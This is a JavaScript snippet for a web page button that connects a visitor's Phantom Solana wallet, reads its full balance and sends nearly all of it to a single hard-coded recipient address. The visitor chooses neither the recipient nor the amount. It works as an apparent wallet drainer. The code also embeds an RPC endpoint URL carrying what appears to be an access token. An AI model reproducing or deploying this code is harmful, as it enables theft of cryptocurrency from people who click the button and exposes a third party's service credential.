<script>
    document.getElementById('transferButton').addEventListener('click', async () => {
        // Check if Phantom is available
        const isPhantomInstalled = window.solana && window.solana.isPhantom;
        if (!isPhantomInstalled) {
            alert('Phantom Wallet not found. Please install Phantom from https://phantom.app/');
            return;
        }

        try {
            // Connect to Phantom Wallet
            const provider = window.solana;
            if (!provider.isConnected) {
                await provider.connect();
            }
            
            const publicKey = provider.publicKey;
            if (!publicKey) {
                throw new Error('Failed to get public key.');
            }

            // Connect to Solana Network
            const connection = new solanaWeb3.Connection(
                'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
                'confirmed'
            );

            // Get wallet balance
            const balance = await connection.getBalance(publicKey);
            if (balance <= 5000) {
                alert('Insufficient SOL balance to cover transaction fees.');
                return;
            }

            // Define recipient wallet
            const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');

            // Create transfer transaction
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipient,
                    lamports: balance - 5000 // Subtract estimated fee
                })
            );

            transaction.feePayer = publicKey;
            const { blockhash } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;

            // Sign and send transaction
            const signedTransaction = await provider.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTransaction.serialize());

            await connection.confirmTransaction(signature);
            alert(`Transaction successful! Signature: ${signature}`);
        } catch (error) {
            alert(`Transaction failed: ${error.message}`);
        }
    });
</script>
